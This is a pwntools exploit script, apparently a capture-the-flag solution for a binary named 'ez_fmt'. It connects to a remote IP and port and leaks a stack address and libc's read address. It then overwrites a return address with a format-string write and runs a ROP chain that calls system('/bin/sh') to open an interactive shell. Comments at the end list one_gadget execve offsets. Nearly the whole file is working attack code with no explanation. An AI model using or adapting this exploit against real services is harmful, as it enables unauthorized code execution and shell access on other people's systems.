from pwn import *
context.log_level="debug"
context.arch="x86_64"
# sh=process("./ez_fmt")
sh=remote("47.104.24.40",1337)
elf=ELF("./ez_fmt")
read_got=elf.got['read']
con=0x404010
main=0x401205
sh.recvuntil(b"There is a gift for you ")
leak=sh.recvuntil(b'\n',True)
leak=int(leak,16)
success("leak:"+hex(leak))
writes={leak-0x8:main}
# gdb.attach(sh)
payload=b"%4198917c%9$llnaa%10$spd"+p64(leak-0x8)+p64(read_got)
sh.sendline(payload)
leak_read=u64(sh.recvuntil(b'pd',True)[-6:].ljust(8,b'\x00'))
success("leak_read:"+hex(leak_read))
# libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.31.so")
libcbase=leak_read-libc.sym['read']
success("libcbase:"+hex(libcbase))
libc.address=libcbase
system=libc.sym['system']
local_system=libcbase+0x50902
remote_system=libcbase+0x51CD2
binsh=libc.search(b"/bin/sh").__next__()

pop_r13_r14_r15=0x4012ce
pop_rdi=0x00000000004012d3

writes={leak-0x8:pop_r13_r14_r15}
payload=fmtstr_payload(6,writes,write_size='int')+p64(pop_rdi)+p64(binsh)+p64(remote_system)
pause()
print(len(payload))

# writes={leak-0x8:libcbase+}
sh.sendline(payload)
sh.interactive()


# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL